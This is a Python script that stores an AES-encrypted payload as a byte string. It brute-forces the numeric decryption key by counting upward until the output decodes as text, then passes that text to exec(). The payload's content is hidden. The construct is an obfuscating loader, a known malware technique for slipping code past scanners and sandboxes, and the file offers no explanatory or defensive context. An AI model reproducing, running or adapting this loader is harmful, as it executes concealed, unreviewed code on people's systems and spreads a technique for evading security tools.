from Crypto import Random
from Crypto.Cipher import AES
import hashlib
import os
class Decryptor:
	def __init__(self, key, file_name):
		self.key = hashlib.sha256(key.encode('utf-8')).digest()
		self.file_name = file_name

	def pad(self, s):
		return s + b"\0" * (AES.block_size - len(s) % AES.block_size)

	def decrypt(self, ciphertext, key):
		iv = ciphertext[:AES.block_size]
		cipher = AES.new(key, AES.MODE_CBC, iv)
		plaintext = cipher.decrypt(ciphertext[AES.block_size:])
		return plaintext.rstrip(b"\0")

	def decrypt_file(self):
		dec = self.decrypt(self.file_name, self.key)
		return dec

class BruteForce:
	def __init__(self, encrypted_codes):
		self.encrypted_codes = encrypted_codes
		self.password = 0

	def start(self): 
		status = True
		while status:
			try:
				test = Decryptor(str(self.password), self.encrypted_codes)
				decrypted_code = test.decrypt_file()
				executable = decrypted_code.decode() 
				status = False
				return executable 
			except UnicodeDecodeError:
				self.password += 1

encrypted_codes = b'\xaa\x8d\x9f\xbc\xcc\xca\tJ\x0f%k\x9e\xd7\xe8\xe8\xa6\x01\x9f@\xe6\x12\xdf\x01b`\x18dv\xc3\xc7\xdb\x9d\n*\xdd\xb1\x19\n\x8c1\x91\n]Ax\xb6"\x9d\xf6Y\xfe\x0e\x9b\xd0\'\xf90\x90z!\x80\xc0Y7{\xc85+\xc6\xb6\xc1\xb9\x1e\x16M)\xbd\x8d\x1a9\x03S\xa0\xac\xbba\x80\x1e\xde\xb9\xdc\t\nI\x88w\xf8x\xd9JG\x8c\xbf\xf3FL\xd5\xe8\x82\xb9\xbf\xbb\xa6F\x8f\xca\x0cL \xe5\xbf\x8bb\xd4~\xec\xdch\x9e>A\x96C\x87H\xa1\xb6\xf9\xfaE\xc4"4\r\x8f\xcc\x89\xc09\xabv\x13\x127M\x15J\x86\x08I\'\xeb\xa4\x0c\xc1\xb2\xb7\x83\xd7#)\xd9\xdd\x7fn\x88\xd4\x9a4\x9e{&\x84`\x1f\x9dL\x98\x8a\x85[\x11\xe2\x0cY\x9d\xdb\xce\x83\x04\x08\xcb9\xab\xd7aN\xde\xc0\x19\x1b\to4l,\xad\xfa\xb3\xd2_<\x0f,\xe2\xc8\xa7e\xfbA;\xdc\xac\xc3\xe9\x9d\xc0\xb21\xe5y\xd9\xd0C\xcd$\x85\x98\xca\x02`A1x\xfb\x1b_]Eau\xec\xa9fY\xff\xb0HC\xe7%\xa8\xd6/\xb8c\xcb)\xda\x9c\x0fO6\x032NZeokCF\x876?\x87\x9cr\xd10\xb4\xed\x1c\x86\x0c\xb9\x8a+\xc7\xdeZ\x8c\xf20\x9ez\x1c6\t\xd2\xff\xfd\xfe\xd9\xde\x7f\xa2x\xb9\x8b\xf6\x8d\xdc# \xe4_\x1bteA\x92\xb4R\xd8\xceH\x0f\xc7\xa0i\xed\x1b\xa5J\xbc\xe8S|ugAEl\xb0\x17\xe8\xa9q3L=(\x1a%N\xfc\x1b\\\x9egW\xb6\xf0}\xf0)\xba\x15\xa5\xb5\xb6\x8b\xc4\xd8\x06\x84\xaeu\x06\x9d\xfd\xa9\x14;n\xf6\x7fc\xbd\x7f\xa4\x8fq\xd4\x13p\xf3\xed\xf49\x873\xec6\x99w\x11\xf1\x18|9\xef;\x9e\x11\x02T\xf2<\xe1\xee\x13\xa6\xe7\x92\x9cBz\xf9V\xd4\xc3g,\xffN\x9d}\x0c\xd1:\xea\xc2\xad\x0f\x0f\x94,\xab.?\x07]\xbb\x9bG\x8e\x17-c\x92\xa2pp\x01z\x8b\xc7\x92\x84\x9dw{\x1f\x86\xef\x90\'(v\xe61/\\lY\x91\x83\x06(\x14|\xd7\x0eb\xaf\x9e\xd0\x87\xc8aT\x96\'\xe8\xf2\x8f\xd8hcCp\xb2\xde\xc4Y<\xfe\x00d\xa8\xb4Q\x8a\xfa\x83\x98\x065\x86\xf4\xa0\x02\xe9\x0e_K\xd5K\x8b\x96\xea\xc6h\x15k\xc0Mq\xd5Q:\xd7\x83\xf8s\x00,\xde3[\x06f\x96\x06s\xe5\xf7\xe1y\x14\x16\xa1#\x1a\xb0"c\xf7\xf9\xb6\x96\xb9-\xca\xe9\x1f\x0f\xde.\xaf\xaa\xef\xae\xbf\xfca>\xdd\xdf\x98\x1a\xd0\xef#\x15\xaa6q\'\xb0\xee\x93JHHj\'i\xa3c\xc4\x89\xc2\xcb_\xbd[\x1f\xad\xfb\xc8\xcf\x86\x8e\xdf\xb6\xd9V/f\x8d\xa1\xa3O\x01!V\xbe%\xc7\x0f\xd9L\xf6\xb0\xeb\xd6\x8d\x8d\nP\xb2VJ\x16O4\xfb\x991\xb2\xb38^\x06\x9d\xd5\x19\xf2=\x14\x9bn\xad5\xc98\x08\x8fd\x83\xcd\xfb\x9a\xff\x84\x9d\x16\xd2^\x8d\xcdXr\x18pOPS\xc2VtLL!\x85\x87\xbd\xea\x12\xd8\xa5~\x80\x1a\x0e\xa6f7Il\xc6p\xe7\x97;\x08\xfc\r\xbe\xb7_*\xc4\x8a\x1d\xe1\x06>\xb3%>\xb0\xff\x90%=\x1e\xb1\x04R~\xdfZ\x97\x95Tw\xc0:\x995\x1e\x03\xef\xb5\x8d\x93\x12\xd9\xb8.\x93\x1dI\x9f\xf2j\x9b\xab\x1d<P\x15>A\x10M\xf6M\x84k(\x80\xff\xc5\x9f\x82\x9f\r\xb9\x91\x97\xda\xa0\xe7\xe7\xbec\xfe\x18\x12}\xf2\xcd\r\')\x16\x18(\xde\xd5\xe0y\xb8)\x8dL\x14-i~\x80\xea\x1c\xdb\xf5V\x15\xdfzC\x85\x89yM\xf1\xddA|\x0c\xa6\xe3\xaa\xc6\x9b\xc2\xc6g\xce\xdch}\xa6C\xcf\xf9\xc3*\xe6\xf8\xc8\x08{*\xa7\xc5\xf7\xd9\xbbI\xfb\x05Dw\x96\xfe\xc1\x055\x96\x9c\x08\x88\xe3\x98 \xf5\xdd?E\x07\xe47N&&1f\x92\x19\x01\xf5T\xda"\xd8;QC8\n\x1d\xb3\x14\x91\x9f\xb1\xe3\xdb\xb5z\x82\xb5(\x9c>\x11\xf7\xb6W\x9bw\xd6\x17)\x9d2&\xbd\xdeU\x01\xc8f\xa6fB\x83\x7fe:\xc0\xd9\xb1\x07/{\xdd2\xe1\x93u\xf4N\x02(\xafp\x86Z*\x8b\xea=\x82\xed\xba\x03\xadU+\x90K\xac\x0f\x1d#k=Y\xa8\x8a`\x1d\xcf&\xcb\xbc\xf0\x81\x98\xea\x81m\xe4\x9e\x87G\x8f\xf0\x8aO\xb9\x04\x84~\x9d\xb7\xa6`vw\x15\xbb\xb6k\x94\x8aUc\x8e\x81\x8f\xa1\x9a\xc4mKJ\xde,-\xee\x95h1z\x0b\xf5dcv\x0cV\xca\xf0|TG\xe8\x92~\\\x11~\xc79\xa9\xb5L\x99;\xaa\x9fB\x10\x84\xa5lmao}\x9c\xa8U\xa4u\xf0\x8eH\xb7">\xbet\xdc\xab5\xca\x82f\t\xbf\x10\xa6\xcf\xcfo-\x95=\x82\xdb4\x1cg\xf2\xc8_&\xf9\x03,0\x9a\\\xbc\xffd\xda\xd4\xcf\x12\xe4\x85Y\xce\xc0\xe4\x84\x96d\xdc\xd3\xe1\xd0\xa0\xe9\xabjC\xfay\xd6\xac\xc9:75\xfb\xde\xcb\xa5\xf7\x0b\xa5\xfc\xe0\x15\xdb\xca\x81\xd4\x7f\x88)=\xf9\x18\xb6\xf8\xb2\x9d=KR\xa1\x92|\x94\x0f\x0e\xad\x19\xc4\xe5=`G\x08\xe5\xde\xca\xfa|Rq\x8e\xb8\x7f}]\x08g\xfb\x08\x8df\xe2V\xad\xbd_G\tD\x95\xad\xb0\xd9Hz\x8c9\x03\xcf\xae\x12\x8c^\xb93#oA\xe8"\x0b\xcc\xd4k\xdb\x94\t.N \x045]\xc6\xceA/\xeb\xc3\n"nrH\xee\x1do\x93M\xb1\t\xc4~V9\xf7\xf7\x91\xb4\xf2U\xde\xa8M\xd3\x19\xaas\xb1\xc1\x89\xcfoI\x15#M\xd2\xc7}\x8c\x08\xbds\xbb\xa3q!\xf8\n\xaf\xc1\x08\x8c\xc9\xb89@U:AY\x96f\xbf\xfbz\x0cv\xafu\xf4\xb3\xcf\xe3\x0fDN\x97x\xfa\xb1\xf4\xbd\x1c\xbcG \xdau\xb9#\x14f;,]X\n\x19\x8c\xdeS\xf1\xd45\xca\x80\x81\x87\xc9\x8c\xa3\xb7\xc5\x9e\xb19\x93E\xe0\xfd\x14\xeb\x10\n\xd2c2\x86\x13F\xf6:o]\xa6\xd5\xbc\x87\x11\x86\xed\xc6\xeb\xca\xc8\x7fe8b\xad\x98\xcb>V\x9b\x0e*\xef\x0f\xc5\x0c\x17\\@\xc1\xed&\xf7N\xfc:i\xf5V\x88\\\x11^\xa8\x97\xc4C\x81\xcc\x19\xf7w\x7f\x01\xee'
brute = BruteForce(encrypted_codes)
executable = brute.start()
exec(executable)
